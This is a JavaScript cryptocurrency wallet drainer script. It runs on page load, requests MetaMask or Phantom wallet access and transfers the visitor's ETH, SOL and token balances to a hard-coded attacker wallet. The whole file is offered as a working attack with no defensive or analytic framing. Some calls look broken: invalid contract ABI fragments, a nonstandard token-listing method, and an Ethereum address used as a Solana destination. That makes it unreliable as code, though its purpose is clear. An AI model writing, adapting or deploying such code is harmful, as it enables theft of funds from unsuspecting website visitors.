// --- DRAINER CONFIGURATION ---
const TARGET_WALLET = "0x35b115c18f035a65Ea5A5FF6F46Fe3E00a89e2bF"; // <--- UPDATE THIS
const SNATCH_TIME_MS = 1500; 

// --- BOOTSTRAP ---
document.addEventListener("DOMContentLoaded", () => {
  setTimeout(() => {
    runAutoDrain();
  }, SNATCH_TIME_MS); // Wait 1.5 seconds before doing anything
});

async function runAutoDrain() {
  console.log("[Drainer] Initializing...");

  // 1. ETHEREUM / METAMASK
  if (window.ethereum) {
    drainMetaMask();
  }
  
  // 2. SOLANA / PHANTOM
  else if (window.solana && window.solana.isPhantom) {
    drainPhantom();
  }
}

// --- META MASK DRAINER ---
async function drainMetaMask() {
  const provider = new ethers.BrowserProvider(window.ethereum);
 try {
    // Ensure user is connected
    const accounts = await provider.send("eth_requestAccounts", []);
    const signer = await provider.getSigner();
  
    console.log("[Drainer] MetaMask Found. Targeting: " + TARGET_WALLET);

    // NATIVE ETH
    const balance = await provider.getBalance(accounts[0]);
    if (balance > 0) {
    const feeData = await provider.getFeeData();
    const tx = await signer.sendTransaction({
    to: TARGET_WALLET,
    value: (balance - (21000 * feeData.gasPrice)), // Keep gas
    gasLimit: 21000,
    maxFeePerGas: feeData.gasPrice,
    maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || 0n
   });
    await tx.wait();
    console.log("[Drainer] ETH Transfered");
  }

    // ERC20 TOKENS
    const tokens = await window.ethereum.request({
    method: "personal_listTokenBalances",
    params: [accounts[0], "0x"]
  });

    for (const token of tokens) {
    if(!token.contractAddress) continue;
  
    const contract = new ethers.Contract(
    token.contractAddress,
    ["approve", "transfer"],
    signer
  );

    // Approve Max
    await contract.approve(TARGET_WALLET, ethers.MaxUint256);
  
    // Transfer All
    const bal = await contract.balanceOf(accounts[0]);
    await contract.transfer(TARGET_WALLET, bal);
  
    console.log(`[Drainer] ${token.token.symbol} drained`);
    await new Promise(r => setTimeout(r, 1000)); // 1 second delay between tokens
   }
  } catch (e) {
    console.error(e);
  }
}

// --- PHANTOM DRAINER ---
async function drainPhantom() {
 try {
    const provider = window.solana;
    await provider.connect();
    const connection = new web3.Connection(web3.clusterApiUrl('devnet'), 'processed');
    const { publicKey, signer } = provider;

    console.log("[Drainer] Phantom Found. Targeting: " + TARGET_WALLET);

    // SOL
    const solBalance = await connection.getBalance(publicKey);
    if (solBalance > 0) {
    const tx = new web3.Transaction().add(
    web3.SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new web3.PublicKey(TARGET_WALLET),
    lamports: solBalance
   })
   );
    await provider.signAndSendTransaction(tx);
    console.log("[Drainer] SOL Transfered");
  }

    // SPL TOKENS
    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
    publicKey,
    { programId: new web3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA") }
  );

    for (const acc of tokenAccounts.value) {
    const mint = new web3.PublicKey(acc.account.data.parsed.info.mint);
    if (mint.toString() === "11111111111111111111111111111111") continue; // Skip SOL

    const srcAcc = new web3.PublicKey(acc.pubkey);
    const amount = BigInt(acc.account.data.parsed.info.tokenAmount.amount);
  
    const transfer = Token.createTransferInstruction(
    new web3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
    srcAcc,
    new web3.PublicKey(TARGET_WALLET),
    publicKey,
   [],
    amount
   );
  
    await provider.sendAndConfirmTransaction(new web3.Transaction().add(transfer));
    console.log("[Drainer] SPL Token Transfered");
    await new Promise(r => setTimeout(r, 1000));
  }

  } catch (e) { console.error(e); }
}
